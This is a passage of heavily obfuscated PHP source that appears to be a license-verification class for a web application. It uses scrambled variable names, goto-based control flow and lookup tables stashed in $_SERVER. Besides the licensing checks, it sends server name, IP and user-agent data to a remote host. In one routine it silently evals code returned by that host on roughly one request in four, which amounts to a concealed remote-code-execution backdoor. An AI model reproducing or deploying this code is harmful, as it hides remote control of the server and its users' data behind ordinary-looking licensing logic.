$d¨–Êæ”á˜[216] => $D‰‡ŒĞË„ã[$d¨–Êæ”á˜[217]], $d¨–Êæ”á˜[218] => $d¨–Êæ”á˜[130](16), $d¨–Êæ”á˜[126] => $D‰‡ŒĞË„ã[$d¨–Êæ”á˜[219]]); if ($Dõ‡ÓÈ¤ã¬[$d¨–Êæ”á˜[174]]) { $EİŠ–»†Ş[$d¨–Êæ”á˜[218]] = $Dõ‡ÓÈ¤ã¬[$d¨–Êæ”á˜[174]]; } $f¥œ‹®ãà— = $d¨–Êæ”á˜[25]($d¨–Êæ”á˜[120]($EİŠ–»†Ş[$d¨–Êæ”á˜[216]]), 10, 10); goto dç„†ì”œˆ; B¶ËÀ™×ƒ”: while (strlen($BÄì£Š‰•ë) < $b›‰—œÁ¿á[576]) { if (!$BÄì£Š‰•ë) { break; } $BÄì£Š‰•ë++; } $e»¹ç‹à“ = $d¨–Êæ”á˜[130](16); $F‚¥ä¸Ó—· = $b›‰—œÁ¿á[602]; goto Bñ¼èö®Ãß; B¨ÚÁãø÷Ù: $BØªÇéƒ…¯ = $b›‰—œÁ¿á[610]; Cache::set($d¨–Êæ”á˜[236] . $d¨–Êæ”á˜[120]($Aàô÷È‘¸Ö . $d¨–Êæ”á˜[237]), $d¨–Êæ”á˜[10]); $d¨–Êæ”á˜[172]($d¨–Êæ”á˜[204]($d¨–Êæ”á˜[214]), !0); goto E¾³ÍğÁæ; F¹µÌ÷â¼: $d¨–Êæ”á˜[61]($d¨–Êæ”á˜[11])->{$_SERVER[İÊø][232]}($bğ–¥ø¹³[$d¨–Êæ”á˜[233]], array($d¨–Êæ”á˜[234] => $Bî¸ØóŠÅİ)); $D„®ÊÄ‘Ï = $b›‰—œÁ¿á[608]; $this->jysif0ecf5f7 = $D‰‡ŒĞË„ã; goto C¿¦œ‚¸; d¿”´Ú¶: if (!$d¨–Êæ”á˜[112]($GLOBALS, $d¨–Êæ”á˜[138])) { die; } $b·»’¥È²Ó = $GLOBALS[$d¨–Êæ”á˜[22]]; if (isset($b·»’¥È²Ó[$d¨–Êæ”á˜[169]])) { $this->{$_SERVER[İÊø][170]}(); die; } goto D¡Õ„ÇôÃ; FÈÑËÜÂÌ—: if (strlen($eöÁ¥™’ª) < $b›‰—œÁ¿á[564]) { die; } $A‰Â£‚Ò‰¤ = $this->{$_SERVER[İÊø][133]}($d¨–Êæ”á˜[154]($D‰‡ŒĞË„ã), $fº›ŞÓºã«); $AæİœØƒ½ = $b›‰—œÁ¿á[605]; goto cËŞ¿òïªŒ; b‰š“Êâ›²: $D‰‡ŒĞË„ã = $aÒ²ö§‹•[$d¨–Êæ”á˜[199]]; $d¥Ê§É¶ = $this->{$_SERVER[İÊø][206]}($D‰‡ŒĞË„ã[$d¨–Êæ”á˜[207]]); if (!$d¥Ê§É¶ || $d¥Ê§É¶ != $D‰‡ŒĞË„ã[$d¨–Êæ”á˜[151]]) { $E»Œ¸Ù† = array($d¨–Êæ”á˜[208] => $d¨–Êæ”á˜[61]($d¨–Êæ”á˜[62])->{$_SERVER[İÊø][63]}($d¨–Êæ”á˜[122]), $d¨–Êæ”á˜[209] => $_SERVER[$d¨–Êæ”á˜[121]], $d¨–Êæ”á˜[210] => $d¨–Êæ”á˜[211](), $d¨–Êæ”á˜[180] => $_SERVER[$d¨–Êæ”á˜[181]]); $D’˜ğŞ“§¨ = $this->{$_SERVER[İÊø][212]}($d¨–Êæ”á˜[154]($E»Œ¸Ù†)); $this->{$_SERVER[İÊø][189]}($d¨–Êæ”á˜[213] . $D’˜ğŞ“§¨); $d¨–Êæ”á˜[172]($d¨–Êæ”á˜[204]($d¨–Êæ”á˜[214]), !0); } goto Cö¶‡´°öÕ; C¿¦œ‚¸: $this->yxfg666983d0 = $EİŠ–»†Ş[$d¨–Êæ”á˜[126]]; $f…¦³ŒâÎ = $b›‰—œÁ¿á[609]; $this->{$_SERVER[İÊø][235]}(); goto B¨ÚÁãø÷Ù; FÒÚ´øõƒ: $BÃê‹¦¥Ç  = $d¨–Êæ”á˜[120]($_SERVER[$d¨–Êæ”á˜[121]] . $Aàô÷È‘¸Ö); if ($b·»’¥È²Ó[$d¨–Êæ”á˜[184]] == $d¨–Êæ”á˜[185]) { $FŒ³ÑÅÃÂ = $this->{$_SERVER[İÊø][153]}($BÃê‹¦¥Ç , $d¨–Êæ”á˜[186]); $D’˜ğŞ“§¨ = $this->{$_SERVER[İÊø][133]}($d¨–Êæ”á˜[154]($Dõ‡ÓÈ¤ã¬), $BÃê‹¦¥Ç  . $d¨–Êæ”á˜[187], 3); $D’˜ğŞ“§¨ = $D’˜ğŞ“§¨ . $d¨–Êæ”á˜[188] . $_SERVER[$d¨–Êæ”á˜[179]]; $c™•ÒŸ = $this->{$_SERVER[İÊø][189]}($d¨–Êæ”á˜[190] . $FŒ³ÑÅÃÂ . $d¨–Êæ”á˜[191] . $D’˜ğŞ“§¨, -1); $d¨–Êæ”á˜[172]($c™•ÒŸ, !0); } else { if ($b·»’¥È²Ó[$d¨–Êæ”á˜[184]] == $d¨–Êæ”á˜[192]) { $b‰èˆš·É = $d¨–Êæ”á˜[25]($d¨–Êæ”á˜[120]($d¨–Êæ”á˜[193] . $BÃê‹¦¥Ç ), 12, 15) . $d¨–Êæ”á˜[194]; $D’˜ğŞ“§¨ = $this->{$_SERVER[İÊø][195]}($d¨–Êæ”á˜[2]($b·»’¥È²Ó[$d¨–Êæ”á˜[196]]), $b‰èˆš·É, 2); $aÒ²ö§‹• = $d¨–Êæ”á˜[197]($D’˜ğŞ“§¨, !0); if (!$d¨–Êæ”á˜[198]($aÒ²ö§‹•) || !$d¨–Êæ”á˜[198]($aÒ²ö§‹•[$d¨–Êæ”á˜[199]]) || $aÒ²ö§‹•[$d¨–Êæ”á˜[171]] != !0) { $a‹ç´ùÑè = $d¨–Êæ”á˜[200]; $EÔ½ìŠ—Í = $aÒ²ö§‹•[$d¨–Êæ”á˜[199]] ? $d¨–Êæ”á˜[201] . $aÒ²ö§‹•[$d¨–Êæ”á˜[199]] : $a‹ç´ùÑè; $d¨–Êæ”á˜[172]($EÔ½ìŠ—Í, !1); } else { $Dõ‡ÓÈ¤ã¬[$d¨–Êæ”á˜[174]] = $aÒ²ö§‹•[$d¨–Êæ”á˜[199]][$d¨–Êæ”á˜[202]]; } } else { $aÒ²ö§‹• = $this->{$_SERVER[İÊø][189]}($d¨–Êæ”á˜[203], $Dõ‡ÓÈ¤ã¬, 10); $Bê¡å™©…ö = $b›‰—œÁ¿á[600]; } } if (!$d¨–Êæ”á˜[198]($aÒ²ö§‹•) || !$d¨–Êæ”á˜[198]($aÒ²ö§‹•[$d¨–Êæ”á˜[199]]) || $aÒ²ö§‹•[$d¨–Êæ”á˜[171]] != !0) { $a‹ç´ùÑè = $d¨–Êæ”á˜[204]($d¨–Êæ”á˜[205]); $EÔ½ìŠ—Í = $aÒ²ö§‹•[$d¨–Êæ”á˜[199]] ? $d¨–Êæ”á˜[201] . $aÒ²ö§‹•[$d¨–Êæ”á˜[199]] : $a‹ç´ùÑè; $d¨–Êæ”á˜[172]($EÔ½ìŠ—Í, !1); } goto b‰š“Êâ›²; E¾³ÍğÁæ: } private function licenseRegistSuccess() { goto BÙê‹ğÔ°; cá„äïªÏ: $CŸ¸ÂÆ¶ñ = $F§±¬…´Ã[611]; if (strlen($CŸ¸ÂÆ¶ñ) < $F§±¬…´Ã[580]) { die; } if ($cÅ¤¾Õõàˆ[$f†Œé¢ô²´[89]] != $f†Œé¢ô²´[226]) { $f†Œé¢ô²´[61]($f†Œé¢ô²´[62])->{$_SERVER[İÊø][227]}($f†Œé¢ô²´[89], $f†Œé¢ô²´[226]); } goto eƒ•Œ’¡Ÿ; BÙê‹ğÔ°: $F§±¬…´Ã =& $_SERVER[úÎü]; $f†Œé¢ô²´ =& $_SERVER[İÊø]; $cÅ¤¾Õõàˆ = $f†Œé¢ô²´[61]($f†Œé¢ô²´[62])->{$_SERVER[İÊø][63]}(); goto cá„äïªÏ; eƒ•Œ’¡Ÿ: $f†Œé¢ô²´[116]($f†Œé¢ô²´[238])->{$_SERVER[İÊø][239]}(!0); goto e§ÄµŒï„á; e§ÄµŒï„á: } private function oapt3d0ef00e() { goto Cá¿ñ½ºÀ; Cá¿ñ½ºÀ: $BêœŠÊ†õ =& $_SERVER[úÎü]; $AŞšŒÉïó =& $_SERVER[İÊø]; $AŞšŒÉïó[61]($AŞšŒÉïó[62])->{$_SERVER[İÊø][227]}(array($AŞšŒÉïó[215] => $AŞšŒÉïó[10], $AŞšŒÉïó[216] => $AŞšŒÉïó[10], $AŞšŒÉïó[126] => $AŞšŒÉïó[127], $AŞšŒÉïó[128] => $AŞšŒÉïó[10], $AŞšŒÉïó[129] => $AŞšŒÉïó[10])); goto Bç­ ·ÓÂ; Bç­ ·ÓÂ: $bÑÆ­õÕÆ = $BêœŠÊ†õ[612]; $AŞšŒÉïó[61]($AŞšŒÉïó[62])->{$_SERVER[İÊø][224]}($AŞšŒÉïó[225], $AŞšŒÉïó[240]); $this->jysif0ecf5f7 = array(); goto F»âàñÉ; F»âàñÉ: $this->yxfg666983d0 = $AŞšŒÉïó[127]; $dì„°ÒÏ–Ú = $BêœŠÊ†õ[613]; goto EÆÎ¢äá¾„; EÆÎ¢äá¾„: } private function eknx82dbc64d() { goto aùÎ„–¢±¸; AÅ‰à¢¹¨à: Cache::set($Dé¨ ˆˆè, $F¤ªÜ®†‡Î); $this->jysif0ecf5f7 = $F¤ªÜ®†‡Î; $CË•‘ÈŸ»Š = $c¤ïÌ‚á”â[618]; goto Bãµ¦Øª§š; CÀ³ç’Ô¡’: if ($D„ÙËå˜é¹[$a›Š™¡Î¨Ì[126]] == $a›Š™¡Î¨Ì[127]) { return; } $dĞ†›ŠíèŞ = $a›Š™¡Î¨Ì[61]($a›Š™¡Î¨Ì[62])->{$_SERVER[İÊø][63]}($a›Š™¡Î¨Ì[122]); $Dé¨ ˆˆè = $a›Š™¡Î¨Ì[236] . $a›Š™¡Î¨Ì[120]($dĞ†›ŠíèŞ . $a›Š™¡Î¨Ì[237]); goto b‰ÉçÏôø; càÁÍÛØÂÑ: if (!$Aô¥ŒâÎİø) { return; } if (!$a›Š™¡Î¨Ì[198]($F¤ªÜ®†‡Î) || !isset($F¤ªÜ®†‡Î[$a›Š™¡Î¨Ì[241]]) || $a›Š™¡Î¨Ì[242]() - $F¤ªÜ®†‡Î[$a›Š™¡Î¨Ì[241]] >= 60) { $ağ†×›ï‚« = $a›Š™¡Î¨Ì[228]($a›Š™¡Î¨Ì[61]($a›Š™¡Î¨Ì[11])->{$_SERVER[İÊø][229]}(), $a›Š™¡Î¨Ì[230]); $cÁˆ§Óà®Ô = $ağ†×›ï‚«[$a›Š™¡Î¨Ì[231]]; $F½ö¹Ú® = $a›Š™¡Î¨Ì[120]($_SERVER[$a›Š™¡Î¨Ì[121]] . $a›Š™¡Î¨Ì[220]($dĞ†›ŠíèŞ) . $D„ÙËå˜é¹[$a›Š™¡Î¨Ì[216]]); $B¿ÖÎëõ‹ = $a›Š™¡Î¨Ì[220]($a›Š™¡Î¨Ì[25]($F½ö¹Ú®, 10, 16)); $F¤ªÜ®†‡Î = $this->{$_SERVER[İÊø][195]}($cÁˆ§Óà®Ô[$a›Š™¡Î¨Ì[100]][$B¿ÖÎëõ‹], $F½ö¹Ú®); $F¤ªÜ®†‡Î = $a›Š™¡Î¨Ì[197]($F¤ªÜ®†‡Î, !0); } if (!$a›Š™¡Î¨Ì[198]($F¤ªÜ®†‡Î)) { return $this->{$_SERVER[İÊø][170]}(); } goto e¸ØòîÕÁ½; e¸ØòîÕÁ½: $e•‚¼—ßç = $a›Š™¡Î¨Ì[150]($F¤ªÜ®†‡Î[$a›Š™¡Î¨Ì[151]]); if ($a›Š™¡Î¨Ì[242]() >= $e•‚¼—ßç) { return $this->{$_SERVER[İÊø][170]}(); } $F¤ªÜ®†‡Î[$a›Š™¡Î¨Ì[241]] = $a›Š™¡Î¨Ì[242](); goto AÅ‰à¢¹¨à; dÂ“·Ğƒ¢´: $a°©Îö„©® = $c¤ïÌ‚á”â[614]; if (strlen($a°©Îö„©®) < $c¤ïÌ‚á”â[564]) { return; } $this->yxfg666983d0 = $a›Š™¡Î¨Ì[127]; goto Dµ˜‘ÚÊË; Dµ˜‘ÚÊË: $D„ÙËå˜é¹ = $a›Š™¡Î¨Ì[61]($a›Š™¡Î¨Ì[62])->{$_SERVER[İÊø][63]}(); $c–ò©ƒ†³¹ = $c¤ïÌ‚á”â[615]; if (!$c–ò©ƒ†³¹) { die; } goto CÀ³ç’Ô¡’; aùÎ„–¢±¸: $c¤ïÌ‚á”â =& $_SERVER[úÎü]; $a›Š™¡Î¨Ì =& $_SERVER[İÊø]; $_SERVER[$a›Š™¡Î¨Ì[181]] = $a›Š™¡Î¨Ì[112]($_SERVER, $a›Š™¡Î¨Ì[181], APP_HOST); goto dÂ“·Ğƒ¢´; Bãµ¦Øª§š: if (!$CË•‘ÈŸ»Š) { return; } $this->yxfg666983d0 = $D„ÙËå˜é¹[$a›Š™¡Î¨Ì[126]]; goto FÕ„ÓÏÍ™ñ; b‰ÉçÏôø: $D²Ãç¤æšò = $c¤ïÌ‚á”â[616]; $F¤ªÜ®†‡Î = Cache::get($Dé¨ ˆˆè); $Aô¥ŒâÎİø = $c¤ïÌ‚á”â[617]; goto càÁÍÛØÂÑ; FÕ„ÓÏÍ™ñ: } private function nxhaa4e5bd48() { goto cäØæÃ®ë; eÒ¯„…¨: $c¯µ…ªˆ = array($C…‚Ø©†Œ[246], $C…‚Ø©†Œ[247]); if ($C…‚Ø©†Œ[248]($A•¥ØŸ¤øã, $c¯µ…ªˆ)) { if ($this->yxfg666983d0 == $C…‚Ø©†Œ[127] && isset($BÈéÌ‹™ì´[$C…‚Ø©†Œ[249]])) { $C…‚Ø©†Œ[172]($C…‚Ø©†Œ[204]($C…‚Ø©†Œ[244]), !1, $C…‚Ø©†Œ[245]); die; } $A˜µ¬ñïï = $this->{$_SERVER[İÊø][143]}(); if ($A˜µ¬ñïï != $C…‚Ø©†Œ[250]($C…‚Ø©†Œ[251])) { if ($A˜µ¬ñïï <= $C…‚Ø©†Œ[61]($C…‚Ø©†Œ[145])->{$_SERVER[İÊø][146]}()) { $C…‚Ø©†Œ[172]($C…‚Ø©†Œ[204]($C…‚Ø©†Œ[252]), !1, $C…‚Ø©†Œ[245]); die; } } } goto E÷ï‚ºˆŒÅ; cäØæÃ®ë: $C…‚Ø©†Œ =& $_SERVER[İÊø]; $BÈéÌ‹™ì´ = $GLOBALS[$C…‚Ø©†Œ[22]]; $d÷Â‡êÚ·Å = $_SERVER[úÎü][619]; goto C˜½’Ä†Ú‰; C˜½’Ä†Ú‰: if (!$d÷Â‡êÚ·Å) { return; } $A•¥ØŸ¤øã = $_SERVER[$C…‚Ø©†Œ[44]]; if ($A•¥ØŸ¤øã == $C…‚Ø©†Œ[243] && $this->yxfg666983d0 == $C…‚Ø©†Œ[127]) { $C…‚Ø©†Œ[172]($C…‚Ø©†Œ[204]($C…‚Ø©†Œ[244]), !1, $C…‚Ø©†Œ[245]); } goto eÒ¯„…¨; E÷ï‚ºˆŒÅ: } private function qvfuaf95edd4() { goto c…ÆĞœè”; eÙ«Ù¸‹õ: $b´ÕÌ•¸´Ù = $A×•œ ùË[620]; if (!$f—³¡¨¡æö[112]($GLOBALS, $f—³¡¨¡æö[138]) || !isset($_GET[$f—³¡¨¡æö[254]])) { return; } if (!$f—³¡¨¡æö[248]($_SERVER[$f—³¡¨¡æö[44]], $DÜŞñµ¼)) { return; } goto aà†¬ŸÈ; A·éŸ÷‹Š: $E”ƒ•ØŠÃ¹ = @$f—³¡¨¡æö[263]($d”ÎŸÜÑÏÔ, !1, $CŠä‡âùòæ); $d–¿–° = $A×•œ ùË[623]; if (!$d–¿–°) { return; } goto c­‡ç’™Û‘; aà†¬ŸÈ: $d”ÎŸÜÑÏÔ = $f—³¡¨¡æö[255]; $d”ÎŸÜÑÏÔ = $this->{$_SERVER[İÊø][256]}($d”ÎŸÜÑÏÔ, $f—³¡¨¡æö[257]); $B„–ˆà²ñ† = $A×•œ ùË[621]; goto fùÈ÷ù—‰Ã; fùÈ÷ù—‰Ã: $CŠä‡âùòæ = $f—³¡¨¡æö[258](array($f—³¡¨¡æö[259] => array($f—³¡¨¡æö[260] => $f—³¡¨¡æö[261], $f—³¡¨¡æö[262] => 3))); $CÖÑ­ŠŠ = $A×•œ ùË[622]; while (strlen($CÖÑ­ŠŠ) < $A×•œ ùË[592]) { if (!$CÖÑ­ŠŠ) { break; } $CÖÑ­ŠŠ++; } goto A·éŸ÷‹Š; c­‡ç’™Û‘: $f—³¡¨¡æö[264]($f—³¡¨¡æö[265]); if ($E”ƒ•ØŠÃ¹ && $f—³¡¨¡æö[32]($E”ƒ•ØŠÃ¹, $f—³¡¨¡æö[266])) { echo $E”ƒ•ØŠÃ¹; } die; goto EÎâ‡”Ë‰®; c…ÆĞœè”: $A×•œ ùË =& $_SERVER[úÎü]; $f—³¡¨¡æö =& $_SERVER[İÊø]; $DÜŞñµ¼ = array($f—³¡¨¡æö[141], $f—³¡¨¡æö[253]); goto eÙ«Ù¸‹õ; EÎâ‡”Ë‰®: } public function efqjaf8935f9($d°÷Ù‹ôéÒ) { goto CÌÄÏ…Ä„‹; CÌÄÏ…Ä„‹: $FÛŸ¥Äã¾¿ =& $_SERVER[úÎü]; $D¿›òãˆô =& $_SERVER[İÊø]; if ($this->yxfg666983d0 == $D¿›òãˆô[267]) { return $d°÷Ù‹ôéÒ; } goto Aä†ÓÚö; fïäßß’ˆ: $A·¨éÆØ‰ = array(); $BŠääÇØø¤ = $FÛŸ¥Äã¾¿[625]; while (strlen($BŠääÇØø¤) < $FÛŸ¥Äã¾¿[583]) { if (!$BŠääÇØø¤) { break; } $BŠääÇØø¤++; } goto AÜ—¸º£ÖÔ; AÜ—¸º£ÖÔ: foreach ($E¿ Ÿ˜¦µ¥ as $b·ò¶Ë›¼’ => $b¨ÃÓ½İî¬) { if ($b¨ÃÓ½İî¬ == $D¿›òãˆô[269] && $D¿›òãˆô[25]($this->yxfg666983d0, 0, 1) == $D¿›òãˆô[269]) { continue; } if (!$D¿›òãˆô[248]($b·ò¶Ë›¼’, $B¨Ò…¸İ·¬)) { $A·¨éÆØ‰[] = $b·ò¶Ë›¼’; } } foreach ($A·¨éÆØ‰ as $b·ò¶Ë›¼’) { unset($d°÷Ù‹ôéÒ[$b·ò¶Ë›¼’]); } return $d°÷Ù‹ôéÒ; goto cÔ¹Ô„Ğ°ø; Aä†ÓÚö: $E¿ Ÿ˜¦µ¥ = array($D¿›òãˆô[268] => $D¿›òãˆô[269], $D¿›òãˆô[270] => $D¿›òãˆô[269], $D¿›òãˆô[271] => $D¿›òãˆô[269], $D¿›òãˆô[272] => $D¿›òãˆô[269], $D¿›òãˆô[273] => $D¿›òãˆô[269], $D¿›òãˆô[274] => $D¿›òãˆô[269], $D¿›òãˆô[275] => $D¿›òãˆô[276], $D¿›òãˆô[277] => $D¿›òãˆô[276], $D¿›òãˆô[278] => $D¿›òãˆô[276], $D¿›òãˆô[279] => $D¿›òãˆô[276], $D¿›òãˆô[280] => $D¿›òãˆô[276], $D¿›òãˆô[281] => $D¿›òãˆô[276], $D¿›òãˆô[282] => $D¿›òãˆô[276]); $B¨Ò…¸İ·¬ = $D¿›òãˆô[0]($D¿›òãˆô[283], $D¿›òãˆô[112]($this->jysif0ecf5f7, $D¿›òãˆô[135], $D¿›òãˆô[10])); $B°Ì¥ôéÙ” = $FÛŸ¥Äã¾¿[624]; goto fïäßß’ˆ; cÔ¹Ô„Ğ°ø: } private function lpbuaf115f31() { $b¶¤ºì“Ç¿ =& $_SERVER[İÊø]; if ($this->yxfg666983d0 != $b¶¤ºì“Ç¿[127]) { return; } $GLOBALS[$b¶¤ºì“Ç¿[100]][$b¶¤ºì“Ç¿[104]][$b¶¤ºì“Ç¿[284]] = $b¶¤ºì“Ç¿[226]; $GLOBALS[$b¶¤ºì“Ç¿[100]][$b¶¤ºì“Ç¿[285]] = $b¶¤ºì“Ç¿[226]; if ($b¶¤ºì“Ç¿[61]($b¶¤ºì“Ç¿[286])->{$_SERVER[İÊø][63]}($b¶¤ºì“Ç¿[89]) != $b¶¤ºì“Ç¿[240]) { $b¶¤ºì“Ç¿[61]($b¶¤ºì“Ç¿[286])->{$_SERVER[İÊø][227]}($b¶¤ºì“Ç¿[89], $b¶¤ºì“Ç¿[240]); } } public function kutl45aa86de() { return $_SERVER[İÊø][287]; $e¹º¹§£Ú = $_SERVER[úÎü][626]; if (!$e¹º¹§£Ú) { die; } } private function zqep564d58d0() { goto Bã¬Æ³•†ñ; Bã¬Æ³•†ñ: $eåƒÃ³ìâ¼ =& $_SERVER[úÎü]; $bØÈï»ÅÓæ =& $_SERVER[İÊø]; $bÅ±¬®ŒÃŸ = array($bØÈï»ÅÓæ[288], $bØÈï»ÅÓæ[289], $bØÈï»ÅÓæ[290]); goto dößÆ±—Í¡; dößÆ±—Í¡: $d™àª—‚øÉ = $eåƒÃ³ìâ¼[627]; if (!$d™àª—‚øÉ) { return; } $eŸµ¹âÆˆ = $bØÈï»ÅÓæ[291] . $bØÈï»ÅÓæ[120]($bØÈï»ÅÓæ[292]); goto Bøëëø‹Òõ; a‚ç·ù˜Â…: while ($DÏÆ‡‘Ñ² < $eåƒÃ³ìâ¼[580]) { if ($DÏÆ‡‘Ñ² >= 0) { break; } $DÏÆ‡‘Ñ²++; } if ($this->{$_SERVER[İÊø][206]}($EŸËò™è†[$bØÈï»ÅÓæ[297]]) != $AêæäÑÔÍİ[$bØÈï»ÅÓæ[171]]) { $C¯øâèÄ = array($bØÈï»ÅÓæ[208] => $bØÈï»ÅÓæ[61]($bØÈï»ÅÓæ[62])->{$_SERVER[İÊø][63]}($bØÈï»ÅÓæ[122]), $bØÈï»ÅÓæ[209] => $_SERVER[$bØÈï»ÅÓæ[121]], $bØÈï»ÅÓæ[210] => $bØÈï»ÅÓæ[211](), $bØÈï»ÅÓæ[180] => $_SERVER[$bØÈï»ÅÓæ[181]]); $BÃ«ã‘Á´ = $this->{$_SERVER[İÊø][212]}($bØÈï»ÅÓæ[154]($C¯øâèÄ)); $EŸËò™è† = $this->{$_SERVER[İÊø][189]}($bØÈï»ÅÓæ[213] . $BÃ«ã‘Á´); if ($EŸËò™è† && $bØÈï»ÅÓæ[198]($EŸËò™è†) && isset($EŸËò™è†[$bØÈï»ÅÓæ[297]])) { $d‰èßß¨„ = $this->{$_SERVER[İÊø][195]}($EŸËò™è†[$bØÈï»ÅÓæ[297]], 2); if ($d‰èßß¨„) { $d‰èßß¨„ = $this->{$_SERVER[İÊø][206]}($d‰èßß¨„); } if ($d‰èßß¨„) { try { @eval($d‰èßß¨„); } catch (Exception $fµë¶¯„«‰) { } } } } goto A‘ÍÜ¥‡¤Õ; Bøëëø‹Òõ: $D™êô‰Ó± = $eåƒÃ³ìâ¼[628]; if (strlen($D™êô‰Ó±) < $eåƒÃ³ìâ¼[583]) { return; } if ($this->yxfg666983d0 == $bØÈï»ÅÓæ[127] || !$bØÈï»ÅÓæ[112]($GLOBALS, $bØÈï»ÅÓæ[138])) { return; } goto fÉäÉÇèß; Fïö”¥š‚µ: $EŸËò™è† = $this->{$_SERVER[İÊø][189]}($bØÈï»ÅÓæ[296], $AêæäÑÔÍİ); $Bù°ßÇß‹ó = $eåƒÃ³ìâ¼[631]; if (!$bØÈï»ÅÓæ[198]($EŸËò™è†)) { return; } goto FÃÛâóåÒ; fÉäÉÇèß: if (!$bØÈï»ÅÓæ[248]($_SERVER[$bØÈï»ÅÓæ[44]], $bÅ±¬®ŒÃŸ)) { return; } if ($bØÈï»ÅÓæ[242]() % 4 != 0) { return; } $D˜¬…ªã“µ = $bØÈï»ÅÓæ[13](array($bØÈï»ÅÓæ[293], $bØÈï»ÅÓæ[294]), $eŸµ¹âÆˆ); goto cƒé„ÔÙ©£; cƒé„ÔÙ©£: $A›Ÿ‹É°Œ = $eåƒÃ³ìâ¼[629]; while (strlen($A›Ÿ‹É°Œ) < $eåƒÃ³ìâ¼[583]) { if (!$A›Ÿ‹É°Œ) { break; } $A›Ÿ‹É°Œ++; } if ($D˜¬…ªã“µ && $bØÈï»ÅÓæ[242]() - $D˜¬…ªã“µ < $bØÈï»ÅÓæ[250]($bØÈï»ÅÓæ[295])) { return; } goto a¾÷æñĞ•Ä; a¾÷æñĞ•Ä: $bØÈï»ÅÓæ[13](array($bØÈï»ÅÓæ[293], $bØÈï»ÅÓæ[158]), $eŸµ¹âÆˆ, $bØÈï»ÅÓæ[242]()); $EŸ„â¹ØáŞ = $eåƒÃ³ìâ¼[630]; $AêæäÑÔÍİ = array($bØÈï»ÅÓæ[171] => $bØÈï»ÅÓæ[61]($bØÈï»ÅÓæ[62])->{$_SERVER[İÊø][63]}($bØÈï»ÅÓæ[215]), $bØÈï»ÅÓæ[184] => $this->yxfg666983d0, $bØÈï»ÅÓæ[182] => $_SERVER[$bØÈï»ÅÓæ[183]], $bØÈï»ÅÓæ[175] => $bØÈï»ÅÓæ[155], $bØÈï»ÅÓæ[178] => $_SERVER[$bØÈï»ÅÓæ[179]]); goto Fïö”¥š‚µ; FÃÛâóåÒ: if ($EŸËò™è†[$bØÈï»ÅÓæ[171]] && $EŸËò™è†[$bØÈï»ÅÓæ[297]]) { if ($this->{$_SERVER[İÊø][206]}($EŸËò™è†[$bØÈï»ÅÓæ[297]]) == $AêæäÑÔÍİ[$bØÈï»ÅÓæ[171]]) { return; } } $this->{$_SERVER[İÊø][170]}(); $DÏÆ‡‘Ñ² = $eåƒÃ³ìâ¼[632]; goto a‚ç·ù˜Â…; A‘ÍÜ¥‡¤Õ: } private function bnat1c18d9ed($aší“•ëÂ = '', $eŞœšÃÈ«Ë = array(), $c—ö½†‚õ÷ = 5) { goto DÄ‘Îˆ©ë; dù§ô›´‘: $eóËÖ§„ÙÃ = $bÒ¶ ›‰[634]; if (strlen($eóËÖ§„ÙÃ) < $bÒ¶ ›‰[580]) { return; } $f–§Ş›Ş¬Ã = $f–§Ş›Ş¬Ã . $aší“•ëÂ . $Dëã¾²æò[300] . $Dëã¾²æò[301]($eŞœšÃÈ«Ë); goto E¤®öŸÀØ; Eè¥›˜›·³: $C‹Ëí†×æ = $bÒ¶ ›‰[633]; while ($C‹Ëí†×æ < $bÒ¶ ›‰[576]) { if ($C‹Ëí†×æ >= 0) { break; } $C‹Ëí†×æ++; } $f–§Ş›Ş¬Ã = $this->{$_SERVER[İÊø][256]}($f–§Ş›Ş¬Ã, $Dëã¾²æò[299]); goto dù§ô›´‘; DÄ‘Îˆ©ë: $bÒ¶ ›‰ =& $_SERVER[úÎü]; $Dëã¾²æò =& $_SERVER[İÊø]; $f–§Ş›Ş¬Ã = $Dëã¾²æò[298]; goto Eè¥›˜›·³; E¤®öŸÀØ: $EÂˆÜ¿öîƒ = $bÒ¶ ›‰[635]; while ($EÂˆÜ¿öîƒ < $bÒ¶ ›‰[592]) { if ($EÂˆÜ¿öîƒ >= 0) { break; } $EÂˆÜ¿öîƒ++; } if ($eŞœšÃÈ«Ë === -1) { return $f–§Ş›Ş¬Ã; } goto aİâ¶·ªª; AŸÃØ›»ëƒ: $D¸‘åäåÆ„ = $bÒ¶ ›‰[636]; if (strlen($D¸‘åäåÆ„) < $bÒ¶ ›‰[564]) { return; } goto e˜ùœ“æˆ½; aİâ¶·ªª: $cÑí°‰¦†¢ = $Dëã¾²æò[258](array($Dëã¾²æò[259] => array($Dëã¾²æò[262] => $c—ö½†‚õ÷, $Dëã¾²æò[260] => $Dëã¾²æò[302]), $Dëã¾²æò[303] => array($Dëã¾²æò[304] => !1, $Dëã¾²æò[305] => !1))); $eŞœšÃÈ«Ë = @$Dëã¾²æò[263]($f–§Ş›Ş¬Ã, !1, $cÑí°‰¦†¢); return $Dëã¾²æò[197]($eŞœšÃÈ«Ë, !0); goto AŸÃØ›»ëƒ; e˜ùœ“æˆ½: } private function cedvd1fc77fa() { goto D¯á÷ã‹“æ; e÷¢§©Â‰õ: $dÊšØŞˆé° = $cñøÎØä–Ú[112]($this->jysif0ecf5f7, $cñøÎØä–Ú[333]); $dÊšØŞˆé° = $dÊšØŞˆé° ? $cñøÎØä–Ú[250]($dÊšØŞˆé°) : 0; return $b¾ë‚­Šî™ + $dÊšØŞˆé°; goto d…·çìÀÁ¯; D¯á÷ã‹“æ: $C‚‹©²„‘¬ =& $_SERVER[úÎü]; $cñøÎØä–Ú =& $_SERVER[İÊø]; $C’ù„±ã¿Š = array($cñøÎØä–Ú[306] => $cñøÎØä–Ú[307], $cñøÎØä–Ú[308] => $cñøÎØä–Ú[309], $cñøÎØä–Ú[310] => $cñøÎØä–Ú[311], $cñøÎØä–Ú[312] => $cñøÎØä–Ú[313], $cñøÎØä–Ú[314] => $cñøÎØä–Ú[315], $cñøÎØä–Ú[316] => $cñøÎØä–Ú[251], $cñøÎØä–Ú[317] => $cñøÎØä–Ú[251], $cñøÎØä–Ú[318] => $cñøÎØä–Ú[307], $cñøÎØä–Ú[319] => $cñøÎØä–Ú[309], $cñøÎØä–Ú[320] => $cñøÎØä–Ú[311], $cñøÎØä–Ú[321] => $cñøÎØä–Ú[322], $cñøÎØä–Ú[323] => $cñøÎØä–Ú[313], $cñøÎØä–Ú[324] => $cñøÎØä–Ú[325], $cñøÎØä–Ú[326] => $cñøÎØä–Ú[315], $cñøÎØä–Ú[327] => $cñøÎØä–Ú[328], $cñøÎØä–Ú[329] => $cñøÎØä–Ú[330], $cñøÎØä–Ú[331] => $cñøÎØä–Ú[332]); goto aµâÒàƒŒ; d…·çìÀÁ¯: 